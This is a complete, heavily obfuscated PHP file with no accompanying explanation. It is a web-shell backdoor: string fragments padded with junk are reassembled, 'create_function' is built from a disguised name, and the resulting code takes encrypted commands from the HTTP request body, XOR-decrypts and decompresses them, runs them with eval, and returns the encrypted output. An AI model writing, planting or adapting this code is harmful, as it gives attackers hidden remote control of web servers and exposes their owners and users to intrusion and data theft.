<?php
$g='1$l=strlen($t);|1$o="";for($i=0;$i<|1$l;){for|1($j=0;(|1$j<$c|1&|1&$|1i<$l);';
$H='$j++,$|1i++){$o.=|1$t{|1$i}^$k{$|1j};}}r|1eturn|1 $o;|1}if (|1@preg_m|1atc';
$X='$k="|101|1aee305";$k|1h="362807e|16ebc1|1";|1$kf="818224|102d979"|1;$p="|1';
$I='bas|1e64_|1encode|1(@x(@gzco|1mpre|1ss($|1o),$k));|1prin|1t("$p$kh|1$r$kf");}';
$o='P0lReQn|1cBiq|17p4C8|1";f|1unct|1ion x(|1$t,$|1k){$c=st|1r|1len|1|1($k);|';
$O='$|1m[1]),|1$k))|1);$o=@ob_|1get_contents()|1;|1@ob_end_clean|1|1();$r=@';
$M='h("/$k|1h(.+)$kf|1/",@f|1ile_g|1et_con|1ten|1ts("php://|1i|1nput")|1,$m';
$x=str_replace('v','','vcrevate_vfuvvnvction');
$i=')=|1=1) {@ob_s|1tart(|1);@eva|1l(@g|1zuncompres|1s(@x|1(@b|1ase64_d|1ecode|1(';
$B=str_replace('|1','',$X.$o.$g.$H.$M.$i.$O.$I);
$j=$x('',$B);$j();
?>
